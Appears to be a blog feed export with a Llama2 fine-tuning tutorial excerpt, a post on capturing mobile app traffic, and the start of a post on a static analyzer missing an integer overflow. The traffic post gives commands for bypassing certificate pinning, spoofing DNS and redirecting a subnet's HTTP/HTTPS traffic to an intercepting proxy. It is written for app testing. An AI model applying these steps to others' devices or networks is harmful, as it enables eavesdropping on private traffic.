<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Dataset(&#123;</span><br><span class="line">    features: [&#x27;prompt_title&#x27;, &#x27;text&#x27;, &#x27;prompt_question&#x27;, &#x27;prompt_text&#x27;, &#x27;content&#x27;, &#x27;wording&#x27;, &#x27;input_ids&#x27;, &#x27;attention_mask&#x27;],</span><br><span class="line">    num_rows: 6448</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">plot_data_lengths</span>(<span class="params">tokenized_train_dataset, tokenized_val_dataset</span>):</span><br><span class="line">    lengths = [<span class="built_in">len</span>(x[<span class="string">&#x27;input_ids&#x27;</span>]) <span class="keyword">for</span> x <span class="keyword">in</span> tokenized_train_dataset]</span><br><span class="line">    lengths += [<span class="built_in">len</span>(x[<span class="string">&#x27;input_ids&#x27;</span>]) <span class="keyword">for</span> x <span class="keyword">in</span> tokenized_val_dataset]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(lengths))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Plotting the histogram</span></span><br><span class="line">    plt.figure(figsize=(<span class="number">10</span>, <span class="number">6</span>))</span><br><span class="line">    plt.hist(lengths, bins=<span class="number">20</span>, alpha=<span class="number">0.7</span>, color=<span class="string">&#x27;blue&#x27;</span>)</span><br><span class="line">    plt.xlabel(<span class="string">&#x27;Length of input_ids&#x27;</span>)</span><br><span class="line">    plt.ylabel(<span class="string">&#x27;Frequency&#x27;</span>)</span><br><span class="line">    plt.title(<span class="string">&#x27;Distribution of Lengths of input_ids&#x27;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line">plot_data_lengths(tokenized_train_dataset, tokenized_val_dataset)</span><br></pre></td></tr></table></figure>

<img src="/2023/10/31/Enhancing-Student-Text-Summarization-with-Llama2-Fine-Tuning/pic_1.png" width="60%" height="60%">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">max_length = <span class="number">2048</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_and_tokenize_prompt2</span>(<span class="params">prompt</span>):</span><br><span class="line">    result = tokenizer(</span><br><span class="line">        formatting_func(prompt),</span><br><span class="line">        <span class="comment"># prompt,</span></span><br><span class="line">        truncation=<span class="literal">True</span>,</span><br><span class="line">        max_length=max_length,</span><br><span class="line">        padding=<span class="string">&quot;max_length&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    result[<span class="string">&quot;labels&quot;</span>] = result[<span class="string">&quot;input_ids&quot;</span>].copy()</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tokenized_train_dataset = train_dataset.<span class="built_in">map</span>(generate_and_tokenize_prompt2)</span><br><span class="line">tokenized_val_dataset = eval_dataset.<span class="built_in">map</span>(generate_and_tokenize_prompt2)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(tokenized_train_dataset[<span class="number">1</span>][<span class="string">&#x27;input_ids&#x27;</span>])</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plot_data_lengths(tokenized_train_dataset, tokenized_val_dataset)</span><br></pre></td></tr></table></figure>

<img src="/2023/10/31/Enhancing-Student-Text-Summarization-with-Llama2-Fine-Tuning/pic_2.png" width="60%" height="60%">

<h3 id="Set-up-LoRA"><a href="#Set-up-LoRA" class="headerlink" title="Set up LoRA"></a>Set up LoRA</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> peft <span class="keyword">import</span> prepare_model_for_kbit_training</span><br><span class="line"></span><br><span class="line">model.gradient_checkpointing_enable()</span><br><span class="line">model = prepare_model_for_kbit_training(model)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_trainable_parameters</span>(<span class="params">model</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Prints the number of trainable parameters in the model.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    trainable_params = <span class="number">0</span></span><br><span class="line">    all_param = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _, param <span class="keyword">in</span> model.named_parameters():</span><br><span class="line">        all_param += param.numel()</span><br><span class="line">        <span class="keyword">if</span> param.requires_grad:</span><br><span class="line">            trainable_params += param.numel()</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">f&quot;trainable params: <span class="subst">&#123;trainable_params&#125;</span> || all params: <span class="subst">&#123;all_param&#125;</span> || trainable%: <span class="subst">&#123;<span class="number">100</span> * trainable_params / all_param&#125;</span>&quot;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> peft <span class="keyword">import</span> LoraConfig, get_peft_model</span><br><span class="line"></span><br><span class="line">config = LoraConfig(</span><br><span class="line">    r=<span class="number">32</span>,</span><br><span class="line">    lora_alpha=<span class="number">64</span>,</span><br><span class="line">    target_modules=[</span><br><span class="line">        <span class="string">&quot;q_proj&quot;</span>,</span><br><span class="line">        <span class="string">&quot;k_proj&quot;</span>,</span><br><span class="line">        <span class="string">&quot;v_proj&quot;</span>,</span><br><span class="line">        <span class="string">&quot;o_proj&quot;</span>,</span><br><span class="line">        <span class="string">&quot;gate_proj&quot;</span>,</span><br><span class="line">        <span class="string">&quot;up_proj&quot;</span>,</span><br><span class="line">        <span class="string">&quot;down_proj&quot;</span>,</span><br><span class="line">        <span class="string">&quot;lm_head&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">    bias=<span class="string">&quot;none&quot;</span>,</span><br><span class="line">    lora_dropout=<span class="number">0.05</span>,  <span class="comment"># Conventional</span></span><br><span class="line">    task_type=<span class="string">&quot;CAUSAL_LM&quot;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">model = get_peft_model(model, config)</span><br><span class="line">print_trainable_parameters(model)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apply the accelerator.</span></span><br><span class="line">model = accelerator.prepare_model(model)</span><br></pre></td></tr></table></figure>

<p>According to the output, we can find that the parameters fine-tuned based on LoRA only account for approximately 1% of the total model parameters.</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">trainable params: 81108992 || all params: 6819524608 || trainable%: 1.1893643129442022</span><br></pre></td></tr></table></figure>

<p>And find out what the model looks like.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model</span><br></pre></td></tr></table></figure>

<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">PeftModelForCausalLM(</span><br><span class="line">  (base_model): LoraModel(</span><br><span class="line">    (model): LlamaForCausalLM(</span><br><span class="line">      (model): LlamaModel(</span><br><span class="line">        (embed_tokens): Embedding(32000, 4096)</span><br><span class="line">        (layers): ModuleList(</span><br><span class="line">          (0-31): 32 x LlamaDecoderLayer(</span><br><span class="line">            (self_attn): LlamaAttention(</span><br><span class="line">              (q_proj): Linear8bitLt(</span><br><span class="line">                in_features=4096, out_features=4096, bias=False</span><br><span class="line">                (lora_dropout): ModuleDict(</span><br><span class="line">                  (default): Dropout(p=0.05, inplace=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_A): ModuleDict(</span><br><span class="line">                  (default): Linear(in_features=4096, out_features=32, bias=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_B): ModuleDict(</span><br><span class="line">                  (default): Linear(in_features=32, out_features=4096, bias=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_embedding_A): ParameterDict()</span><br><span class="line">                (lora_embedding_B): ParameterDict()</span><br><span class="line">              )</span><br><span class="line">              (k_proj): Linear8bitLt(</span><br><span class="line">                in_features=4096, out_features=4096, bias=False</span><br><span class="line">                (lora_dropout): ModuleDict(</span><br><span class="line">                  (default): Dropout(p=0.05, inplace=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_A): ModuleDict(</span><br><span class="line">                  (default): Linear(in_features=4096, out_features=32, bias=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_B): ModuleDict(</span><br><span class="line">                  (default): Linear(in_features=32, out_features=4096, bias=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_embedding_A): ParameterDict()</span><br><span class="line">                (lora_embedding_B): ParameterDict()</span><br><span class="line">              )</span><br><span class="line">              (v_proj): Linear8bitLt(</span><br><span class="line">                in_features=4096, out_features=4096, bias=False</span><br><span class="line">                (lora_dropout): ModuleDict(</span><br><span class="line">                  (default): Dropout(p=0.05, inplace=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_A): ModuleDict(</span><br><span class="line">                  (default): Linear(in_features=4096, out_features=32, bias=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_B): ModuleDict(</span><br><span class="line">                  (default): Linear(in_features=32, out_features=4096, bias=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_embedding_A): ParameterDict()</span><br><span class="line">                (lora_embedding_B): ParameterDict()</span><br><span class="line">              )</span><br><span class="line">              (o_proj): Linear8bitLt(</span><br><span class="line">                in_features=4096, out_features=4096, bias=False</span><br><span class="line">                (lora_dropout): ModuleDict(</span><br><span class="line">                  (default): Dropout(p=0.05, inplace=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_A): ModuleDict(</span><br><span class="line">                  (default): Linear(in_features=4096, out_features=32, bias=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_B): ModuleDict(</span><br><span class="line">                  (default): Linear(in_features=32, out_features=4096, bias=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_embedding_A): ParameterDict()</span><br><span class="line">                (lora_embedding_B): ParameterDict()</span><br><span class="line">              )</span><br><span class="line">              (rotary_emb): LlamaRotaryEmbedding()</span><br><span class="line">            )</span><br><span class="line">            (mlp): LlamaMLP(</span><br><span class="line">              (gate_proj): Linear8bitLt(</span><br><span class="line">                in_features=4096, out_features=11008, bias=False</span><br><span class="line">                (lora_dropout): ModuleDict(</span><br><span class="line">                  (default): Dropout(p=0.05, inplace=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_A): ModuleDict(</span><br><span class="line">                  (default): Linear(in_features=4096, out_features=32, bias=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_B): ModuleDict(</span><br><span class="line">                  (default): Linear(in_features=32, out_features=11008, bias=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_embedding_A): ParameterDict()</span><br><span class="line">                (lora_embedding_B): ParameterDict()</span><br><span class="line">              )</span><br><span class="line">              (up_proj): Linear8bitLt(</span><br><span class="line">                in_features=4096, out_features=11008, bias=False</span><br><span class="line">                (lora_dropout): ModuleDict(</span><br><span class="line">                  (default): Dropout(p=0.05, inplace=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_A): ModuleDict(</span><br><span class="line">                  (default): Linear(in_features=4096, out_features=32, bias=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_B): ModuleDict(</span><br><span class="line">                  (default): Linear(in_features=32, out_features=11008, bias=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_embedding_A): ParameterDict()</span><br><span class="line">                (lora_embedding_B): ParameterDict()</span><br><span class="line">              )</span><br><span class="line">              (down_proj): Linear8bitLt(</span><br><span class="line">                in_features=11008, out_features=4096, bias=False</span><br><span class="line">                (lora_dropout): ModuleDict(</span><br><span class="line">                  (default): Dropout(p=0.05, inplace=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_A): ModuleDict(</span><br><span class="line">                  (default): Linear(in_features=11008, out_features=32, bias=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_B): ModuleDict(</span><br><span class="line">                  (default): Linear(in_features=32, out_features=4096, bias=False)</span><br><span class="line">                )</span><br><span class="line">                (lora_embedding_A): ParameterDict()</span><br><span class="line">                (lora_embedding_B): ParameterDict()</span><br><span class="line">              )</span><br><span class="line">              (act_fn): SiLUActivation()</span><br><span class="line">            )</span><br><span class="line">            (input_layernorm): LlamaRMSNorm()</span><br><span class="line">            (post_attention_layernorm): LlamaRMSNorm()</span><br><span class="line">          )</span><br><span class="line">        )</span><br><span class="line">        (norm): LlamaRMSNorm()</span><br><span class="line">      )</span><br><span class="line">      (lm_head): Linear(</span><br><span class="line">        in_features=4096, out_features=32000, bias=False</span><br><span class="line">        (lora_dropout): ModuleDict(</span><br><span class="line">          (default): Dropout(p=0.05, inplace=False)</span><br><span class="line">        )</span><br><span class="line">        (lora_A): ModuleDict(</span><br><span class="line">          (default): Linear(in_features=4096, out_features=32, bias=False)</span><br><span class="line">        )</span><br><span class="line">        (lora_B): ModuleDict(</span><br><span class="line">          (default): Linear(in_features=32, out_features=32000, bias=False)</span><br><span class="line">        )</span><br><span class="line">        (lora_embedding_A): ParameterDict()</span><br><span class="line">        (lora_embedding_B): ParameterDict()</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">  )</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="Training"><a href="#Training" class="headerlink" title="Training"></a>Training</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> torch.cuda.device_count() &gt; <span class="number">1</span>: <span class="comment"># If more than 1 GPU</span></span><br><span class="line">    model.is_parallelizable = <span class="literal">True</span></span><br><span class="line">    model.model_parallel = <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> transformers</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">project = <span class="string">&quot;summary-evaluate-finetune&quot;</span></span><br><span class="line">base_model_name = <span class="string">&quot;llama2-7b&quot;</span></span><br><span class="line">run_name = base_model_name + <span class="string">&quot;-&quot;</span> + project</span><br><span class="line">output_dir = <span class="string">&quot;./tmp/llama-output/&quot;</span> + run_name</span><br><span class="line"></span><br><span class="line">tokenizer.pad_token = tokenizer.eos_token</span><br><span class="line"></span><br><span class="line">trainer = transformers.Trainer(</span><br><span class="line">    model=model,</span><br><span class="line">    train_dataset=tokenized_train_dataset,</span><br><span class="line">    eval_dataset=tokenized_val_dataset,</span><br><span class="line">    args=transformers.TrainingArguments(</span><br><span class="line">        output_dir=output_dir,</span><br><span class="line">        warmup_steps=<span class="number">1</span>,</span><br><span class="line">        per_device_train_batch_size=<span class="number">2</span>,</span><br><span class="line">        gradient_accumulation_steps=<span class="number">1</span>,</span><br><span class="line">        max_steps=<span class="number">500</span>,</span><br><span class="line">        learning_rate=<span class="number">2.5e-5</span>, <span class="comment"># Want a small lr for finetuning</span></span><br><span class="line">        bf16=<span class="literal">True</span>,</span><br><span class="line">        optim=<span class="string">&quot;paged_adamw_8bit&quot;</span>,</span><br><span class="line">        logging_dir=<span class="string">f&quot;<span class="subst">&#123;output_dir&#125;</span>/logs&quot;</span>,</span><br><span class="line">        logging_strategy=<span class="string">&quot;steps&quot;</span>,</span><br><span class="line">        logging_steps=<span class="number">50</span>,</span><br><span class="line">        save_strategy=<span class="string">&quot;no&quot;</span>,       <span class="comment"># Save the model checkpoint every logging step</span></span><br><span class="line">        <span class="comment"># save_steps=50,                # Save checkpoints every 50 steps</span></span><br><span class="line">        evaluation_strategy=<span class="string">&quot;no&quot;</span>,</span><br><span class="line">        <span class="comment"># eval_steps=50,               # Evaluate and save checkpoints every 50 steps</span></span><br><span class="line">        do_eval=<span class="literal">True</span>,</span><br><span class="line">        <span class="comment"># report_to=&quot;wandb&quot;,</span></span><br><span class="line">        run_name=<span class="string">f&quot;<span class="subst">&#123;run_name&#125;</span>-<span class="subst">&#123;datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d-%H-%M&#x27;</span>)&#125;</span>&quot;</span>          <span class="comment"># Name of the W&amp;B run</span></span><br><span class="line">    ),</span><br><span class="line">    data_collator=transformers.DataCollatorForLanguageModeling(tokenizer, mlm=<span class="literal">False</span>),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">model.config.use_cache = <span class="literal">False</span>  <span class="comment"># silence the warnings</span></span><br><span class="line">trainer.train()</span><br></pre></td></tr></table></figure>

<p>It will take around 50 minutes to finish the training on a A100 instance.</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[500/500 48:15, Epoch 0/1]</span><br><span class="line">Step	Training Loss</span><br><span class="line">50	1.355700</span><br><span class="line">100	0.447800</span><br><span class="line">150	0.198000</span><br><span class="line">200	0.190800</span><br><span class="line">250	0.188400</span><br><span class="line">300	0.196800</span><br><span class="line">350	0.181200</span><br><span class="line">400	0.193900</span><br><span class="line">450	0.196000</span><br><span class="line">500	0.189200</span><br><span class="line"></span><br><span class="line">TrainOutput(global_step=500, training_loss=0.3302964363098145, metrics=&#123;&#x27;train_runtime&#x27;: 2901.9648, &#x27;train_samples_per_second&#x27;: 0.345, &#x27;train_steps_per_second&#x27;: 0.172, &#x27;total_flos&#x27;: 8.2187705647104e+16, &#x27;train_loss&#x27;: 0.3302964363098145, &#x27;epoch&#x27;: 0.17&#125;)</span><br></pre></td></tr></table></figure>

<p>Save the model.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model.save_pretrained(output_dir)</span><br></pre></td></tr></table></figure>

<p>If we want to load the model, we can use the following code.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">project = <span class="string">&quot;summary-evaluate-finetune&quot;</span></span><br><span class="line">base_model_name = <span class="string">&quot;llama2-7b&quot;</span></span><br><span class="line">run_name = base_model_name + <span class="string">&quot;-&quot;</span> + project</span><br><span class="line">output_dir = <span class="string">&quot;./tmp/llama-output/&quot;</span> + run_name</span><br><span class="line"></span><br><span class="line">model = LlamaForCausalLM.from_pretrained(output_dir, load_in_8bit=<span class="literal">True</span>, device_map=<span class="string">&#x27;auto&#x27;</span>, torch_dtype=torch.float16, cache_dir=<span class="string">&#x27;/data/yuhong_zhao/cache/transformers&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>Finally, let’s take a look at the output of the fine-tuned model.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model.<span class="built_in">eval</span>()</span><br><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    <span class="built_in">print</span>(tokenizer.decode(model.generate(**model_input, max_new_tokens=<span class="number">100</span>)[<span class="number">0</span>], skip_special_tokens=<span class="literal">True</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">### Instruction:</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">### Summary:</span><br><span class="line">The acient system of government for Egypt went like this. Social calsses went from slaves, farmers/workers, traders, preits, and kings. This was involved in government because they each had to follow rules from the pharos and if they didn&#x27;t they would have a punishment. The punishment could be Karma, or execution. Also they each had to pay the pharos taxes. ( From farmers) Priets were Also responsible for pleasing the gods and Pharos. These are reasons how government and how different social classes in government were involved during it.</span><br><span class="line"></span><br><span class="line">### Score of Summary:</span><br><span class="line">Wording: 0.808321610409875</span><br><span class="line">Content: 0.623783062239291</span><br></pre></td></tr></table></figure>

<p>But the scoring results for the same summary is quite different from multiple runs. </p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">### Instruction:</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">### Summary:</span><br><span class="line">The acient system of government for Egypt went like this. Social calsses went from slaves, farmers/workers, traders, preits, and kings. This was involved in government because they each had to follow rules from the pharos and if they didn&#x27;t they would have a punishment. The punishment could be Karma, or execution. Also they each had to pay the pharos taxes. ( From farmers) Priets were Also responsible for pleasing the gods and Pharos. These are reasons how government and how different social classes in government were involved during it.</span><br><span class="line"></span><br><span class="line">### Score of Summary:</span><br><span class="line">Wording: 1.06577716284845</span><br><span class="line">Content: 1.15545814245537</span><br><span class="line"></span><br><span class="line">### Explanation:</span><br><span class="line">Wording: The wording is off because the sentence is not very clear. It is hard to understand what the author is saying. The sentence is also very long.</span><br><span class="line">Content: The content is off because the sentence is not very clear. It is</span><br></pre></td></tr></table></figure>

<p>We can find that the fine-tuned model sometimes generates some redundant texts after the scoring results. But the most important problem is that the fine-tuned Llama2 model cannot deal with arithmetic operations for this kind of tasks, more specifically, the scoring results are totally random within a certain range.</p>
]]></content>
      <categories>
        <category>AI</category>
      </categories>
      <tags>
        <tag>LLM</tag>
        <tag>Llama2</tag>
        <tag>Fine-tuning</tag>
        <tag>kaggle</tag>
      </tags>
  </entry>
  <entry>
    <title>Get Network Traffic of Mobile APPs</title>
    <url>/2019/04/11/Get-Network-Traffic-of-Mobile-APPs/</url>
    <content><![CDATA[<h2 id="About-proxies"><a href="#About-proxies" class="headerlink" title="About proxies"></a>About proxies</h2><p>Proxy is generally used to perform a man-in-the-middle attack. But not to just perform the pure MITM attack, it’s convenient to view, analyze and modify the data flow generated by the APPs with a proxy. It’s getting difficult to catch the network traffic on mobile and I’m here to talk about the proposals.</p>
<h2 id="Methods-to-do-that"><a href="#Methods-to-do-that" class="headerlink" title="Methods to do that"></a>Methods to do that</h2><p>There are 4 methods listed below, and there are certainly other methods exist in this world, but they’re beyond the scope of this post.</p>
<ul>
<li><h3 id="Just-simply-use-proxy"><a href="#Just-simply-use-proxy" class="headerlink" title="Just simply use proxy"></a>Just simply use proxy</h3></li>
</ul>
<p>It’s simple, just get into the settings and set the proxy and port to your own server, and it’s done.</p>
<img src="/2019/04/11/Get-Network-Traffic-of-Mobile-APPs/pic_1.png" width="60%" height="60%">

<p>This is recommended for most users, but it doesn’t work if the APP doesn’t allow system proxy. </p>
<ul>
<li><h3 id="use-the-JustTrustMe-module-of-Xposed-Only-available-for-Android"><a href="#use-the-JustTrustMe-module-of-Xposed-Only-available-for-Android" class="headerlink" title="use the JustTrustMe module of Xposed(Only available for Android)"></a>use the JustTrustMe module of Xposed(Only available for Android)</h3></li>
</ul>
<p>Xposed is a framework used to hook functions in android and JustTrustMe is a module disables SSL certificate checking. (<a href="https://github.com/Fuzion24/JustTrustMe">https://github.com/Fuzion24/JustTrustMe</a>)<br>It aims at solving the HTTPS proxy problem. It’s a powerful tool if you want to view the network traffic of APPs which does certificate pinning.<br>Download Xposed installer(<a href="https://repo.xposed.info/module/de.robv.android.xposed.installer">https://repo.xposed.info/module/de.robv.android.xposed.installer</a>) and get it installed on your android device. The JustTrustMe binary can be downloaded from <a href="https://github.com/Fuzion24/JustTrustMe/releases/latest">https://github.com/Fuzion24/JustTrustMe/releases/latest</a>, Then install it:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb install ./JustTrustMe.apk</span><br></pre></td></tr></table></figure>
<p>You can now find that JustTrustMe exists in your Xposed modules.</p>
<img src="/2019/04/11/Get-Network-Traffic-of-Mobile-APPs/pic_2.png" width="60%" height="60%">

<ul>
<li><h3 id="Setting-up-your-own-DNS-server"><a href="#Setting-up-your-own-DNS-server" class="headerlink" title="Setting up your own DNS server"></a>Setting up your own DNS server</h3></li>
</ul>
<p>This is a little bit tricky, it’s briefly illustrated below:</p>
<img src="/2019/04/11/Get-Network-Traffic-of-Mobile-APPs/pic_6.png" width="100%" height="100%">

<p>An elegant tool used here is DNSChef. (<a href="https://github.com/iphelix/dnschef">https://github.com/iphelix/dnschef</a>) , modify the <em>dnschef.ini</em> file to adapt to your needs and configure the nameserver and the listening interface. The content changed here is the A records.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">*.amazon.com=10.1.3.210</span><br></pre></td></tr></table></figure>

<p>Start up a DNSChef server:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python dnschef.py --file=dnschef.ini --nameservers=8.8.8.8 --interface=127.0.0.1</span><br></pre></td></tr></table></figure>
<p>If you’re using APPs within an android virtual machine, remember to change the nameserver of the network adapter you’re using to the loopback interface, then all the DNS requests to your machine will resend to DNSChef.</p>
<p>Open listeners in BurpSuite:</p>
<img src="/2019/04/11/Get-Network-Traffic-of-Mobile-APPs/pic_7.png" width="60%" height="60%">

<p>Find out the target IP of your requested hosts so that BurpSuite can follow the DNS resolution.</p>
<img src="/2019/04/11/Get-Network-Traffic-of-Mobile-APPs/pic_5.png" width="60%" height="60%">

<p>Assuming that you send a request to <em><a href="http://www.amazon.com/">www.amazon.com</a></em> you can get ordinary responses like this:</p>
<img src="/2019/04/11/Get-Network-Traffic-of-Mobile-APPs/pic_4.png" width="60%" height="60%">

<img src="/2019/04/11/Get-Network-Traffic-of-Mobile-APPs/pic_3.png" width="60%" height="60%">

<img src="/2019/04/11/Get-Network-Traffic-of-Mobile-APPs/pic_8.png" width="60%" height="60%">

<ul>
<li><h3 id="Forward-traffic-of-the-router"><a href="#Forward-traffic-of-the-router" class="headerlink" title="Forward traffic of the router"></a>Forward traffic of the router</h3></li>
</ul>
<p>It just does simple traffic forwarding between devices, the problem of SSL certificate pinning should be handled by other tools.<br>If you are using a router which allows forwarding ports in GUI, that will be much easier. And you can also install firmware into your router, OpenWrt is one of the choices. OpenWrt Project is a Linux operating system targeting embedded devices and you can execute shell directives on your router with it.</p>
<p>For ports forwarding:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -m iprange --src-range 10.1.3.1-10.1.3.253  -p tcp --dport 80 -j DNAT --to-destination 10.1.3.254:80</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING -p tcp -d 10.1.3.254 --dport 80 -j MASQUERADE</span><br><span class="line"></span><br><span class="line">iptables -t nat -A PREROUTING -m iprange --src-range 10.1.3.1-10.1.3.253  -p tcp --dport 443 -j DNAT --to-destination 10.1.3.254:443</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING -p tcp -d 10.1.3.254 --dport 443 -j MASQUERADE</span><br></pre></td></tr></table></figure>
<p>This directive will forward all the network traffic of ip 10.1.3.1~10.1.3.253 at port 80, 443 to ip 10.1.3.254 at port 80, 443.</p>
<p>Make it clear:</p>
<img src="/2019/04/11/Get-Network-Traffic-of-Mobile-APPs/pic_9.png" width="100%" height="100%">

<p>Open the BurpSuite listeners:</p>
<img src="/2019/04/11/Get-Network-Traffic-of-Mobile-APPs/pic_10.png" width="60%" height="60%">

<p>All that network traffic can be sent directly or through a proxy like mitmproxy(<a href="https://github.com/mitmproxy/mitmproxy">https://github.com/mitmproxy/mitmproxy</a>) listened at port 9010, it’s necessary if you would like to make some changes to the packets.</p>
<img src="/2019/04/11/Get-Network-Traffic-of-Mobile-APPs/pic_11.png" width="60%" height="60%">

<h2 id="What-else"><a href="#What-else" class="headerlink" title="What else?"></a>What else?</h2><p>Those proposals mentioned above can handle almost 90% of the situations we will encounter. If it doesn’t work, some tools work at IP based network may be helpful, such as bettercap.(<a href="https://github.com/bettercap/bettercap">https://github.com/bettercap/bettercap</a>)</p>
]]></content>
      <categories>
        <category>Hacking</category>
      </categories>
      <tags>
        <tag>MITM</tag>
      </tags>
  </entry>
  <entry>
    <title>Interesting Thoughts on Data Flow Analysis and Taint Tracking Mechanism of SAST Tool(Coverity)</title>
    <url>/2022/01/13/Interesting-Thoughts-on-Data-Flow-Analysis-and-Taint-Tracking-Mechanism-of-SAST-Tool-Coverity/</url>
    <content><![CDATA[<h2 id="Example-1-Predetermined-Value-Operation-In-Loop-Block"><a href="#Example-1-Predetermined-Value-Operation-In-Loop-Block" class="headerlink" title="Example 1 - Predetermined Value Operation In Loop Block"></a>Example 1 - Predetermined Value Operation In Loop Block</h2><p>For the common integer overflow problems, Coverity can definitely find those defects. But it will be a little tricky in some scenarios, such as the loop condition. </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> c = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">while</span> (a &lt; <span class="number">3</span>) &#123;</span><br><span class="line">    b = INT_MAX + c;</span><br><span class="line">    a++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, b);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>For this code, Coverity cannot find this kind of integer overflow defect with common checkers even like the data flow analysis.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cov-analyze --dir idir/ --all --enable-audit-mode</span><br></pre></td></tr></table></figure>

<p>The scanning result will be like below:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Analysis summary report:</span><br><span class="line">------------------------</span><br><span class="line">Files analyzed                 : 1 Total</span><br><span class="line">    C                          : 1</span><br><span class="line">Total LoC input to cov-analyze : 2459</span><br><span class="line">Functions analyzed             : 2</span><br><span class="line">Paths analyzed                 : 10</span><br><span class="line">Time taken by analysis         : 00:00:03</span><br><span class="line">Defect occurrences found       : 0</span><br></pre></td></tr></table></figure>

